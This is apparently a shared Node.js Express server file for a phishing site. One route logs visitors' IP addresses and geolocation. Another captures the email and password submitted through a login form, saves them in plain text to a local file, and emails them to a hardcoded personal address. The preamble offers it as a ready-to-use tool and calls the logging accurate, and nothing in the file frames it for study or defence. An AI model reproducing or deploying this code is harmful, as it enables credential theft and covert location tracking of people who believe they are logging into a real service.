Backend Code: server.js     (Node.js)
This file handles:

IP and Location Tracking( This can be Wrong So don't Depend on this)
Logging Data to db.txt ( 100% Accurate)
Sending Email Notifications(But Not Working you can modify code)
CODES:Start from here.....



const express = require("express");
const nodemailer = require("nodemailer");
const axios = require("axios");
const fs = require("fs");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();

// Middleware for serving static files and parsing data
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Route for tracking IP and location
app.get("/track", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  try {
    // Fetch location data
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const locationData = response.data;

    const logData = {
      ip: ip,
      location: locationData,
      timestamp: new Date().toISOString(),
    };

    // Log to db.txt
    fs.appendFileSync("db.txt", JSON.stringify(logData) + "\n");

    // Send email notification
    await sendEmail("IP and Location Tracked", JSON.stringify(logData, null, 2));

    res.json({ success: true, message: "IP and location tracked successfully." });
  } catch (error) {
    console.error("Error tracking IP:", error);
    res.json({ success: false, message: "Error tracking IP or location." });
  }
});

// Route to handle form submissions (email and password)
app.post("/submit", async (req, res) => {
  const { email, password } = req.body;

  const logData = {
    email,
    password,
    timestamp: new Date().toISOString(),
  };

  // Log to db.txt
  fs.appendFileSync("db.txt", JSON.stringify(logData) + "\n");

  // Send email notification
  await sendEmail("New Login Attempt", `Email: ${email}\nPassword: ${password}`);

  res.json({ success: true, message: "Form submitted successfully." });
});

// Email sending function
async function sendEmail(subject, text) {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "your-email@gmail.com", // Replace with your email
      pass: "your-email-password", // Replace with your app password
    },
  });

  const mailOptions = {
    from: "your-email@gmail.com",
    to: "yashharfode123@gmail.com", // Your email
    subject: subject,
    text: text,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully.");
  } catch (error) {
    console.error("Error sending email:", error);
  }
}

// Start the server
const PORT = 3000;
app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
